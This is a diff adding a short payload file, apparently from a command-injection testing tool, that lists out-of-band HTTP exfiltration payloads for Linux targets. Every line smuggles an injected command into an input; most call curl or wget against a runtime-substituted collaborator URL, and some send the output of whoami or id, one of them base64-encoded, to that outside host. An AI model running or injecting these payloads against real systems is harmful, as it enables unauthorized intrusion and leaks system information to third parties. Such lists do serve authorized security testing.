@@ -1,0 +1,19 @@
+# @default_os:     linux
+# @default_signal: oob
+# @default_blind:  false
+# @default_tier:   4
+#
+# HTTP OOB exfiltration payloads.
+# COLLAB_URL is substituted at runtime.
+
+; curl -s COLLAB_URL
+; wget -q COLLAB_URL
+; curl -s COLLAB_URL/`whoami`
+; curl -s COLLAB_URL/?x=`id`
+$(curl -s COLLAB_URL)
+
+# @label: curl with base64 id
+; curl -s COLLAB_URL/$(id|base64 -w0)
+
+# @label: wget whoami exfil
+; wget -q -O /dev/null COLLAB_URL/`whoami`
